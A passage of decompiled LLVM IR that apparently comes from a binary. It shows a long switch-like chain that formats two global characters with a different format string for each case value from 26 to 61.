dec_label_pc_ae80:                                ; preds = %dec_label_pc_ae74
  %v2_ae80 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ae8c = load i8, i8* @global_var_2c601.66, align 1
  %v3_ae98 = load i8, i8* @global_var_2c602.67, align 1
  %v4_aea4 = sext i8 %v3_ae8c to i32
  %v6_aea4 = sext i8 %v3_ae98 to i32
  %v8_aea4 = call i32 @szprintf(i32 %v2_ae80, i32 ptrtoint ([12 x i8]* @global_var_1ff2c.121 to i32), i32 %v4_aea4, i32 %v6_aea4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aea8

dec_label_pc_aea8:                                ; preds = %dec_label_pc_ae74, %dec_label_pc_ae80
  %v7_aeac = icmp eq i32 %v2_a93c, 26
  br i1 %v7_aeac, label %dec_label_pc_aeb4, label %dec_label_pc_aedc

dec_label_pc_aeb4:                                ; preds = %dec_label_pc_aea8
  %v2_aeb4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aec0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_aecc = load i8, i8* @global_var_2c602.67, align 1
  %v4_aed8 = sext i8 %v3_aec0 to i32
  %v6_aed8 = sext i8 %v3_aecc to i32
  %v8_aed8 = call i32 @szprintf(i32 %v2_aeb4, i32 ptrtoint ([12 x i8]* @global_var_1ff38.123 to i32), i32 %v4_aed8, i32 %v6_aed8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_aedc

dec_label_pc_aedc:                                ; preds = %dec_label_pc_aea8, %dec_label_pc_aeb4
  %v7_aee0 = icmp eq i32 %v2_a93c, 27
  br i1 %v7_aee0, label %dec_label_pc_aee8, label %dec_label_pc_af10

dec_label_pc_aee8:                                ; preds = %dec_label_pc_aedc
  %v2_aee8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_aef4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_af00 = load i8, i8* @global_var_2c602.67, align 1
  %v4_af0c = sext i8 %v3_aef4 to i32
  %v6_af0c = sext i8 %v3_af00 to i32
  %v8_af0c = call i32 @szprintf(i32 %v2_aee8, i32 ptrtoint ([13 x i8]* @global_var_1ff44.125 to i32), i32 %v4_af0c, i32 %v6_af0c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af10

dec_label_pc_af10:                                ; preds = %dec_label_pc_aedc, %dec_label_pc_aee8
  %v7_af14 = icmp eq i32 %v2_a93c, 28
  br i1 %v7_af14, label %dec_label_pc_af1c, label %dec_label_pc_af44

dec_label_pc_af1c:                                ; preds = %dec_label_pc_af10
  %v2_af1c = ptrtoint i32* %stack_var_-36 to i32
  %v3_af28 = load i8, i8* @global_var_2c601.66, align 1
  %v3_af34 = load i8, i8* @global_var_2c602.67, align 1
  %v4_af40 = sext i8 %v3_af28 to i32
  %v6_af40 = sext i8 %v3_af34 to i32
  %v8_af40 = call i32 @szprintf(i32 %v2_af1c, i32 ptrtoint ([13 x i8]* @global_var_1ff54.127 to i32), i32 %v4_af40, i32 %v6_af40, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af44

dec_label_pc_af44:                                ; preds = %dec_label_pc_af10, %dec_label_pc_af1c
  %v7_af48 = icmp eq i32 %v2_a93c, 29
  br i1 %v7_af48, label %dec_label_pc_af50, label %dec_label_pc_af78

dec_label_pc_af50:                                ; preds = %dec_label_pc_af44
  %v2_af50 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af5c = load i8, i8* @global_var_2c601.66, align 1
  %v3_af68 = load i8, i8* @global_var_2c602.67, align 1
  %v4_af74 = sext i8 %v3_af5c to i32
  %v6_af74 = sext i8 %v3_af68 to i32
  %v8_af74 = call i32 @szprintf(i32 %v2_af50, i32 ptrtoint ([12 x i8]* @global_var_1ff64.129 to i32), i32 %v4_af74, i32 %v6_af74, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_af78

dec_label_pc_af78:                                ; preds = %dec_label_pc_af44, %dec_label_pc_af50
  %v7_af7c = icmp eq i32 %v2_a93c, 30
  br i1 %v7_af7c, label %dec_label_pc_af84, label %dec_label_pc_afac

dec_label_pc_af84:                                ; preds = %dec_label_pc_af78
  %v2_af84 = ptrtoint i32* %stack_var_-36 to i32
  %v3_af90 = load i8, i8* @global_var_2c601.66, align 1
  %v3_af9c = load i8, i8* @global_var_2c602.67, align 1
  %v4_afa8 = sext i8 %v3_af90 to i32
  %v6_afa8 = sext i8 %v3_af9c to i32
  %v8_afa8 = call i32 @szprintf(i32 %v2_af84, i32 ptrtoint ([13 x i8]* @global_var_1ff70.131 to i32), i32 %v4_afa8, i32 %v6_afa8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afac

dec_label_pc_afac:                                ; preds = %dec_label_pc_af78, %dec_label_pc_af84
  %v7_afb0 = icmp eq i32 %v2_a93c, 31
  br i1 %v7_afb0, label %dec_label_pc_afb8, label %dec_label_pc_afe0

dec_label_pc_afb8:                                ; preds = %dec_label_pc_afac
  %v2_afb8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_afc4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_afd0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_afdc = sext i8 %v3_afc4 to i32
  %v6_afdc = sext i8 %v3_afd0 to i32
  %v8_afdc = call i32 @szprintf(i32 %v2_afb8, i32 ptrtoint ([12 x i8]* @global_var_1ff80.133 to i32), i32 %v4_afdc, i32 %v6_afdc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_afe0

dec_label_pc_afe0:                                ; preds = %dec_label_pc_afac, %dec_label_pc_afb8
  %v7_afe4 = icmp eq i32 %v2_a93c, 32
  br i1 %v7_afe4, label %dec_label_pc_afec, label %dec_label_pc_b014

dec_label_pc_afec:                                ; preds = %dec_label_pc_afe0
  %v2_afec = ptrtoint i32* %stack_var_-36 to i32
  %v3_aff8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b004 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b010 = sext i8 %v3_aff8 to i32
  %v6_b010 = sext i8 %v3_b004 to i32
  %v8_b010 = call i32 @szprintf(i32 %v2_afec, i32 ptrtoint ([11 x i8]* @global_var_1ff8c.135 to i32), i32 %v4_b010, i32 %v6_b010, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b014

dec_label_pc_b014:                                ; preds = %dec_label_pc_afe0, %dec_label_pc_afec
  %v7_b018 = icmp eq i32 %v2_a93c, 33
  br i1 %v7_b018, label %dec_label_pc_b020, label %dec_label_pc_b048

dec_label_pc_b020:                                ; preds = %dec_label_pc_b014
  %v2_b020 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b02c = load i8, i8* @global_var_2c601.66, align 1
  %v3_b038 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b044 = sext i8 %v3_b02c to i32
  %v6_b044 = sext i8 %v3_b038 to i32
  %v8_b044 = call i32 @szprintf(i32 %v2_b020, i32 ptrtoint ([12 x i8]* @global_var_1ff98.137 to i32), i32 %v4_b044, i32 %v6_b044, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b048

dec_label_pc_b048:                                ; preds = %dec_label_pc_b014, %dec_label_pc_b020
  %v7_b04c = icmp eq i32 %v2_a93c, 34
  br i1 %v7_b04c, label %dec_label_pc_b054, label %dec_label_pc_b07c

dec_label_pc_b054:                                ; preds = %dec_label_pc_b048
  %v2_b054 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b060 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b06c = load i8, i8* @global_var_2c602.67, align 1
  %v4_b078 = sext i8 %v3_b060 to i32
  %v6_b078 = sext i8 %v3_b06c to i32
  %v8_b078 = call i32 @szprintf(i32 %v2_b054, i32 ptrtoint ([12 x i8]* @global_var_1ffa4.139 to i32), i32 %v4_b078, i32 %v6_b078, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b07c

dec_label_pc_b07c:                                ; preds = %dec_label_pc_b048, %dec_label_pc_b054
  %v7_b080 = icmp eq i32 %v2_a93c, 35
  br i1 %v7_b080, label %dec_label_pc_b088, label %dec_label_pc_b0b0

dec_label_pc_b088:                                ; preds = %dec_label_pc_b07c
  %v2_b088 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b094 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b0a0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b0ac = sext i8 %v3_b094 to i32
  %v6_b0ac = sext i8 %v3_b0a0 to i32
  %v8_b0ac = call i32 @szprintf(i32 %v2_b088, i32 ptrtoint ([12 x i8]* @global_var_1ffb0.141 to i32), i32 %v4_b0ac, i32 %v6_b0ac, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0b0

dec_label_pc_b0b0:                                ; preds = %dec_label_pc_b07c, %dec_label_pc_b088
  %v7_b0b4 = icmp eq i32 %v2_a93c, 36
  br i1 %v7_b0b4, label %dec_label_pc_b0bc, label %dec_label_pc_b0e4

dec_label_pc_b0bc:                                ; preds = %dec_label_pc_b0b0
  %v2_b0bc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0c8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b0d4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b0e0 = sext i8 %v3_b0c8 to i32
  %v6_b0e0 = sext i8 %v3_b0d4 to i32
  %v8_b0e0 = call i32 @szprintf(i32 %v2_b0bc, i32 ptrtoint ([12 x i8]* @global_var_1ffbc.143 to i32), i32 %v4_b0e0, i32 %v6_b0e0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b0e4

dec_label_pc_b0e4:                                ; preds = %dec_label_pc_b0b0, %dec_label_pc_b0bc
  %v7_b0e8 = icmp eq i32 %v2_a93c, 37
  br i1 %v7_b0e8, label %dec_label_pc_b0f0, label %dec_label_pc_b118

dec_label_pc_b0f0:                                ; preds = %dec_label_pc_b0e4
  %v2_b0f0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b0fc = load i8, i8* @global_var_2c601.66, align 1
  %v3_b108 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b114 = sext i8 %v3_b0fc to i32
  %v6_b114 = sext i8 %v3_b108 to i32
  %v8_b114 = call i32 @szprintf(i32 %v2_b0f0, i32 ptrtoint ([12 x i8]* @global_var_1ffc8.145 to i32), i32 %v4_b114, i32 %v6_b114, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b118

dec_label_pc_b118:                                ; preds = %dec_label_pc_b0e4, %dec_label_pc_b0f0
  %v7_b11c = icmp eq i32 %v2_a93c, 38
  br i1 %v7_b11c, label %dec_label_pc_b124, label %dec_label_pc_b14c

dec_label_pc_b124:                                ; preds = %dec_label_pc_b118
  %v2_b124 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b130 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b13c = load i8, i8* @global_var_2c602.67, align 1
  %v4_b148 = sext i8 %v3_b130 to i32
  %v6_b148 = sext i8 %v3_b13c to i32
  %v8_b148 = call i32 @szprintf(i32 %v2_b124, i32 ptrtoint ([13 x i8]* @global_var_1ffd4.147 to i32), i32 %v4_b148, i32 %v6_b148, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b14c

dec_label_pc_b14c:                                ; preds = %dec_label_pc_b118, %dec_label_pc_b124
  %v7_b150 = icmp eq i32 %v2_a93c, 39
  br i1 %v7_b150, label %dec_label_pc_b158, label %dec_label_pc_b180

dec_label_pc_b158:                                ; preds = %dec_label_pc_b14c
  %v2_b158 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b164 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b170 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b17c = sext i8 %v3_b164 to i32
  %v6_b17c = sext i8 %v3_b170 to i32
  %v8_b17c = call i32 @szprintf(i32 %v2_b158, i32 ptrtoint ([13 x i8]* @global_var_1ffe4.149 to i32), i32 %v4_b17c, i32 %v6_b17c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b180

dec_label_pc_b180:                                ; preds = %dec_label_pc_b14c, %dec_label_pc_b158
  %v7_b184 = icmp eq i32 %v2_a93c, 40
  br i1 %v7_b184, label %dec_label_pc_b18c, label %dec_label_pc_b1b4

dec_label_pc_b18c:                                ; preds = %dec_label_pc_b180
  %v2_b18c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b198 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b1a4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b1b0 = sext i8 %v3_b198 to i32
  %v6_b1b0 = sext i8 %v3_b1a4 to i32
  %v8_b1b0 = call i32 @szprintf(i32 %v2_b18c, i32 ptrtoint ([13 x i8]* @global_var_1ffd4.147 to i32), i32 %v4_b1b0, i32 %v6_b1b0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1b4

dec_label_pc_b1b4:                                ; preds = %dec_label_pc_b180, %dec_label_pc_b18c
  %v7_b1b8 = icmp eq i32 %v2_a93c, 41
  br i1 %v7_b1b8, label %dec_label_pc_b1c0, label %dec_label_pc_b1e8

dec_label_pc_b1c0:                                ; preds = %dec_label_pc_b1b4
  %v2_b1c0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b1cc = load i8, i8* @global_var_2c601.66, align 1
  %v3_b1d8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b1e4 = sext i8 %v3_b1cc to i32
  %v6_b1e4 = sext i8 %v3_b1d8 to i32
  %v8_b1e4 = call i32 @szprintf(i32 %v2_b1c0, i32 ptrtoint ([13 x i8]* @global_var_1fff4.151 to i32), i32 %v4_b1e4, i32 %v6_b1e4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1b4, %dec_label_pc_b1c0
  %v7_b1ec = icmp eq i32 %v2_a93c, 42
  br i1 %v7_b1ec, label %dec_label_pc_b1f4, label %dec_label_pc_b21c

dec_label_pc_b1f4:                                ; preds = %dec_label_pc_b1e8
  %v2_b1f4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b200 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b20c = load i8, i8* @global_var_2c602.67, align 1
  %v4_b218 = sext i8 %v3_b200 to i32
  %v6_b218 = sext i8 %v3_b20c to i32
  %v8_b218 = call i32 @szprintf(i32 %v2_b1f4, i32 ptrtoint ([13 x i8]* @global_var_20004.153 to i32), i32 %v4_b218, i32 %v6_b218, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b21c

dec_label_pc_b21c:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b1f4
  %v7_b220 = icmp eq i32 %v2_a93c, 43
  br i1 %v7_b220, label %dec_label_pc_b228, label %dec_label_pc_b250

dec_label_pc_b228:                                ; preds = %dec_label_pc_b21c
  %v2_b228 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b234 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b240 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b24c = sext i8 %v3_b234 to i32
  %v6_b24c = sext i8 %v3_b240 to i32
  %v8_b24c = call i32 @szprintf(i32 %v2_b228, i32 ptrtoint ([13 x i8]* @global_var_20014.155 to i32), i32 %v4_b24c, i32 %v6_b24c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b250

dec_label_pc_b250:                                ; preds = %dec_label_pc_b21c, %dec_label_pc_b228
  %v7_b254 = icmp eq i32 %v2_a93c, 44
  br i1 %v7_b254, label %dec_label_pc_b25c, label %dec_label_pc_b284

dec_label_pc_b25c:                                ; preds = %dec_label_pc_b250
  %v2_b25c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b268 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b274 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b280 = sext i8 %v3_b268 to i32
  %v6_b280 = sext i8 %v3_b274 to i32
  %v8_b280 = call i32 @szprintf(i32 %v2_b25c, i32 ptrtoint ([13 x i8]* @global_var_20004.153 to i32), i32 %v4_b280, i32 %v6_b280, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b284

dec_label_pc_b284:                                ; preds = %dec_label_pc_b250, %dec_label_pc_b25c
  %v7_b288 = icmp eq i32 %v2_a93c, 45
  br i1 %v7_b288, label %dec_label_pc_b290, label %dec_label_pc_b2b8

dec_label_pc_b290:                                ; preds = %dec_label_pc_b284
  %v2_b290 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b29c = load i8, i8* @global_var_2c601.66, align 1
  %v3_b2a8 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b2b4 = sext i8 %v3_b29c to i32
  %v6_b2b4 = sext i8 %v3_b2a8 to i32
  %v8_b2b4 = call i32 @szprintf(i32 %v2_b290, i32 ptrtoint ([13 x i8]* @global_var_20024.157 to i32), i32 %v4_b2b4, i32 %v6_b2b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2b8

dec_label_pc_b2b8:                                ; preds = %dec_label_pc_b284, %dec_label_pc_b290
  %v7_b2bc = icmp eq i32 %v2_a93c, 46
  br i1 %v7_b2bc, label %dec_label_pc_b2c4, label %dec_label_pc_b2ec

dec_label_pc_b2c4:                                ; preds = %dec_label_pc_b2b8
  %v2_b2c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b2d0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b2dc = load i8, i8* @global_var_2c602.67, align 1
  %v4_b2e8 = sext i8 %v3_b2d0 to i32
  %v6_b2e8 = sext i8 %v3_b2dc to i32
  %v8_b2e8 = call i32 @szprintf(i32 %v2_b2c4, i32 ptrtoint ([13 x i8]* @global_var_20034.159 to i32), i32 %v4_b2e8, i32 %v6_b2e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b2ec

dec_label_pc_b2ec:                                ; preds = %dec_label_pc_b2b8, %dec_label_pc_b2c4
  %v7_b2f0 = icmp eq i32 %v2_a93c, 47
  br i1 %v7_b2f0, label %dec_label_pc_b2f8, label %dec_label_pc_b320

dec_label_pc_b2f8:                                ; preds = %dec_label_pc_b2ec
  %v2_b2f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b304 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b310 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b31c = sext i8 %v3_b304 to i32
  %v6_b31c = sext i8 %v3_b310 to i32
  %v8_b31c = call i32 @szprintf(i32 %v2_b2f8, i32 ptrtoint ([13 x i8]* @global_var_20044.161 to i32), i32 %v4_b31c, i32 %v6_b31c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b320

dec_label_pc_b320:                                ; preds = %dec_label_pc_b2ec, %dec_label_pc_b2f8
  %v7_b324 = icmp eq i32 %v2_a93c, 48
  br i1 %v7_b324, label %dec_label_pc_b32c, label %dec_label_pc_b354

dec_label_pc_b32c:                                ; preds = %dec_label_pc_b320
  %v2_b32c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b338 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b344 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b350 = sext i8 %v3_b338 to i32
  %v6_b350 = sext i8 %v3_b344 to i32
  %v8_b350 = call i32 @szprintf(i32 %v2_b32c, i32 ptrtoint ([13 x i8]* @global_var_20054.163 to i32), i32 %v4_b350, i32 %v6_b350, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b354

dec_label_pc_b354:                                ; preds = %dec_label_pc_b320, %dec_label_pc_b32c
  %v7_b358 = icmp eq i32 %v2_a93c, 49
  br i1 %v7_b358, label %dec_label_pc_b360, label %dec_label_pc_b388

dec_label_pc_b360:                                ; preds = %dec_label_pc_b354
  %v2_b360 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b36c = load i8, i8* @global_var_2c601.66, align 1
  %v3_b378 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b384 = sext i8 %v3_b36c to i32
  %v6_b384 = sext i8 %v3_b378 to i32
  %v8_b384 = call i32 @szprintf(i32 %v2_b360, i32 ptrtoint ([13 x i8]* @global_var_20064.165 to i32), i32 %v4_b384, i32 %v6_b384, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b388

dec_label_pc_b388:                                ; preds = %dec_label_pc_b354, %dec_label_pc_b360
  %v7_b38c = icmp eq i32 %v2_a93c, 50
  br i1 %v7_b38c, label %dec_label_pc_b394, label %dec_label_pc_b3bc

dec_label_pc_b394:                                ; preds = %dec_label_pc_b388
  %v2_b394 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3a0 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b3ac = load i8, i8* @global_var_2c602.67, align 1
  %v4_b3b8 = sext i8 %v3_b3a0 to i32
  %v6_b3b8 = sext i8 %v3_b3ac to i32
  %v8_b3b8 = call i32 @szprintf(i32 %v2_b394, i32 ptrtoint ([13 x i8]* @global_var_20074.167 to i32), i32 %v4_b3b8, i32 %v6_b3b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3bc

dec_label_pc_b3bc:                                ; preds = %dec_label_pc_b388, %dec_label_pc_b394
  %v7_b3c0 = icmp eq i32 %v2_a93c, 51
  br i1 %v7_b3c0, label %dec_label_pc_b3c8, label %dec_label_pc_b3f0

dec_label_pc_b3c8:                                ; preds = %dec_label_pc_b3bc
  %v2_b3c8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b3d4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b3e0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b3ec = sext i8 %v3_b3d4 to i32
  %v6_b3ec = sext i8 %v3_b3e0 to i32
  %v8_b3ec = call i32 @szprintf(i32 %v2_b3c8, i32 ptrtoint ([14 x i8]* @global_var_20084.169 to i32), i32 %v4_b3ec, i32 %v6_b3ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b3f0

dec_label_pc_b3f0:                                ; preds = %dec_label_pc_b3bc, %dec_label_pc_b3c8
  %v7_b3f4 = icmp eq i32 %v2_a93c, 52
  br i1 %v7_b3f4, label %dec_label_pc_b3fc, label %dec_label_pc_b424

dec_label_pc_b3fc:                                ; preds = %dec_label_pc_b3f0
  %v2_b3fc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b408 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b414 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b420 = sext i8 %v3_b408 to i32
  %v6_b420 = sext i8 %v3_b414 to i32
  %v8_b420 = call i32 @szprintf(i32 %v2_b3fc, i32 ptrtoint ([13 x i8]* @global_var_20094.171 to i32), i32 %v4_b420, i32 %v6_b420, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b424

dec_label_pc_b424:                                ; preds = %dec_label_pc_b3f0, %dec_label_pc_b3fc
  %v7_b428 = icmp eq i32 %v2_a93c, 53
  br i1 %v7_b428, label %dec_label_pc_b430, label %dec_label_pc_b458

dec_label_pc_b430:                                ; preds = %dec_label_pc_b424
  %v2_b430 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b43c = load i8, i8* @global_var_2c601.66, align 1
  %v3_b448 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b454 = sext i8 %v3_b43c to i32
  %v6_b454 = sext i8 %v3_b448 to i32
  %v8_b454 = call i32 @szprintf(i32 %v2_b430, i32 ptrtoint ([14 x i8]* @global_var_200a4.173 to i32), i32 %v4_b454, i32 %v6_b454, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b458

dec_label_pc_b458:                                ; preds = %dec_label_pc_b424, %dec_label_pc_b430
  %v7_b45c = icmp eq i32 %v2_a93c, 54
  br i1 %v7_b45c, label %dec_label_pc_b464, label %dec_label_pc_b48c

dec_label_pc_b464:                                ; preds = %dec_label_pc_b458
  %v2_b464 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b470 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b47c = load i8, i8* @global_var_2c602.67, align 1
  %v4_b488 = sext i8 %v3_b470 to i32
  %v6_b488 = sext i8 %v3_b47c to i32
  %v8_b488 = call i32 @szprintf(i32 %v2_b464, i32 ptrtoint ([13 x i8]* @global_var_200b4.175 to i32), i32 %v4_b488, i32 %v6_b488, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b48c

dec_label_pc_b48c:                                ; preds = %dec_label_pc_b458, %dec_label_pc_b464
  %v7_b490 = icmp eq i32 %v2_a93c, 55
  br i1 %v7_b490, label %dec_label_pc_b498, label %dec_label_pc_b4c0

dec_label_pc_b498:                                ; preds = %dec_label_pc_b48c
  %v2_b498 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4a4 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b4b0 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b4bc = sext i8 %v3_b4a4 to i32
  %v6_b4bc = sext i8 %v3_b4b0 to i32
  %v8_b4bc = call i32 @szprintf(i32 %v2_b498, i32 ptrtoint ([14 x i8]* @global_var_200c4.177 to i32), i32 %v4_b4bc, i32 %v6_b4bc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4c0

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b48c, %dec_label_pc_b498
  %v7_b4c4 = icmp eq i32 %v2_a93c, 56
  br i1 %v7_b4c4, label %dec_label_pc_b4cc, label %dec_label_pc_b4f4

dec_label_pc_b4cc:                                ; preds = %dec_label_pc_b4c0
  %v2_b4cc = ptrtoint i32* %stack_var_-36 to i32
  %v3_b4d8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b4e4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b4f0 = sext i8 %v3_b4d8 to i32
  %v6_b4f0 = sext i8 %v3_b4e4 to i32
  %v8_b4f0 = call i32 @szprintf(i32 %v2_b4cc, i32 ptrtoint ([14 x i8]* @global_var_200d4.179 to i32), i32 %v4_b4f0, i32 %v6_b4f0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b4f4

dec_label_pc_b4f4:                                ; preds = %dec_label_pc_b4c0, %dec_label_pc_b4cc
  %v7_b4f8 = icmp eq i32 %v2_a93c, 57
  br i1 %v7_b4f8, label %dec_label_pc_b500, label %dec_label_pc_b528

dec_label_pc_b500:                                ; preds = %dec_label_pc_b4f4
  %v2_b500 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b50c = load i8, i8* @global_var_2c601.66, align 1
  %v3_b518 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b524 = sext i8 %v3_b50c to i32
  %v6_b524 = sext i8 %v3_b518 to i32
  %v8_b524 = call i32 @szprintf(i32 %v2_b500, i32 ptrtoint ([13 x i8]* @global_var_200e4.181 to i32), i32 %v4_b524, i32 %v6_b524, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b528

dec_label_pc_b528:                                ; preds = %dec_label_pc_b4f4, %dec_label_pc_b500
  %v7_b52c = icmp eq i32 %v2_a93c, 58
  br i1 %v7_b52c, label %dec_label_pc_b534, label %dec_label_pc_b55c

dec_label_pc_b534:                                ; preds = %dec_label_pc_b528
  %v2_b534 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b540 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b54c = load i8, i8* @global_var_2c602.67, align 1
  %v4_b558 = sext i8 %v3_b540 to i32
  %v6_b558 = sext i8 %v3_b54c to i32
  %v8_b558 = call i32 @szprintf(i32 %v2_b534, i32 ptrtoint ([13 x i8]* @global_var_200f4.183 to i32), i32 %v4_b558, i32 %v6_b558, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b55c

dec_label_pc_b55c:                                ; preds = %dec_label_pc_b528, %dec_label_pc_b534
  %v7_b560 = icmp eq i32 %v2_a93c, 59
  br i1 %v7_b560, label %dec_label_pc_b568, label %dec_label_pc_b590

dec_label_pc_b568:                                ; preds = %dec_label_pc_b55c
  %v2_b568 = ptrtoint i32* %stack_var_-36 to i32
  %v3_b574 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b580 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b58c = sext i8 %v3_b574 to i32
  %v6_b58c = sext i8 %v3_b580 to i32
  %v8_b58c = call i32 @szprintf(i32 %v2_b568, i32 ptrtoint ([13 x i8]* @global_var_20104.185 to i32), i32 %v4_b58c, i32 %v6_b58c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b590

dec_label_pc_b590:                                ; preds = %dec_label_pc_b55c, %dec_label_pc_b568
  %v7_b594 = icmp eq i32 %v2_a93c, 60
  br i1 %v7_b594, label %dec_label_pc_b59c, label %dec_label_pc_b5c4

dec_label_pc_b59c:                                ; preds = %dec_label_pc_b590
  %v2_b59c = ptrtoint i32* %stack_var_-36 to i32
  %v3_b5a8 = load i8, i8* @global_var_2c601.66, align 1
  %v3_b5b4 = load i8, i8* @global_var_2c602.67, align 1
  %v4_b5c0 = sext i8 %v3_b5a8 to i32
  %v6_b5c0 = sext i8 %v3_b5b4 to i32
  %v8_b5c0 = call i32 @szprintf(i32 %v2_b59c, i32 ptrtoint ([13 x i8]* @global_var_20114.187 to i32), i32 %v4_b5c0, i32 %v6_b5c0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_b5c4

dec_label_pc_b5c4:                                ; preds = %dec_label_pc_b590, %dec_label_pc_b59c
  %v7_b5c8 = icmp eq i32 %v2_a93c, 61
  br i1 %v7_b5c8, label %dec_label_pc_b5d0, label %dec_label_pc_b5f8

dec_label_pc_b5d0:                                ; preds = %dec_label_pc_b5c4
  %v2_b5d0 = ptrtoint i32* %stack_var_-36 to i32
